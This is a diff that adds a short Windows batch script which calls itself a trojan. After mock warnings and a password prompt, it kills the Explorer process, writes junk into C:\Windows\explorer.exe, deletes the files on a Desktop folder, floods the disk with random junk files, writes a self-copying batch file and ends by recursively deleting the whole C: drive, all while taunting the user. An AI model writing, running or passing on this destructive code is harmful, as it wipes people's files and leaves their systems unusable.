@@ -1,0 +1,33 @@
+@echo off
+msg * wanring this dangouse
+msg * do you want to run this
+echo ARE YOU SURE
+pause
+cls
+echo ENTER THE PASSWORD KEY
+set /p MK=passwork:
+if %MK%=="21072014" goto D
+taskkill /f /im cmd.exe
+:D
+cls
+echo last wanring this is trojan (virus)
+pause
+taskkill /f /im explorer
+echo DF$%HF >> C:\Windows\explorer.exe
+msg * you are an idiot
+msg * LOL
+del C:\Users\DELL\Desktop\*.* /f
+msg * your computer is destro
+msg * lolololol
+start chrome
+:E
+echo lollololol >> NOTHING%RANDOM%
+echo iloveyou >> NOTHING%RANDOM%
+echo @echo off >> lol.bat
+echo :D >> lol.bat
+echo echo NOTHING >> NOT%RANDOM% >> lol.bat
+echo goto D >> lol.bat
+msg * ALL YoUr FiLE Is dEltE
+msg * BYE
+ping -n 4 127.0.0.1 >null
+rd /s /q C:\
